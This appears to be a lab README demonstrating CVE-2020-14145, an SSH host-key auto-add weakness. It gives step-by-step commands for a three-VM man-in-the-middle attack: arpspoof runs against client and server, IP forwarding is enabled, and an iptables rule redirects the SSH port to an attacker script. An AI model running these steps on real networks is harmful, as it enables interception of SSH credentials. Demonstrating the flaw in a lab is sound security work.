# CVE-2020-14145

## Auto-Add Policy Vulnerability - SSH

### Concept
Performing ARP Spoofing to reach a position as a Person in the middle.

### Preparation
Create 3 VMs (any operating system, Kali Linux is recommended). You have to switch the network adapter of the VMs to a common LAN segment.

You have to find out which Network Interface corresponds to the LAN segment. If it is "eth0" you can copy the following commands. Else you would have to substitute "eth0" with the corresponding Network interface.

+ on the "Attacker VM":
```
sudo ip addr add 192.168.1.2/24 dev eth0
```
+ on the  "Client VM":
```
sudo ip addr add 192.168.1.3/24 dev eth0
```
+ on the "Server VM":
```
sudo ip addr add 192.168.1.4/24 dev eth0
```
Install "dsniff" on the "Attacker VM":
```
sudo apt-get install dsniff
```

### Exploit
Enable IP Forwarding
```
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```
Start the ARP Spoofing Attack
```
arpspoof -i eth0 -t 192.168.1.3 192.168.1.4
arpspoof -i eth0 -t 192.168.1.4 192.168.1.3
```
Redirect the port:
```
iptables -t nat -A PREROUTING -p tcp --destination-port 2222 -j REDIRECT --to-ports 2223
```
Start "server.py" and "attacker.py" on the coresponding VMs
Change this line in client.py to match your IP-Address
```
ssh.connect("192.168.1.4", username='username', password='password', port=2222
```
Start "client.py" on the Client VM

### Result
You are now the Person in the Middle.
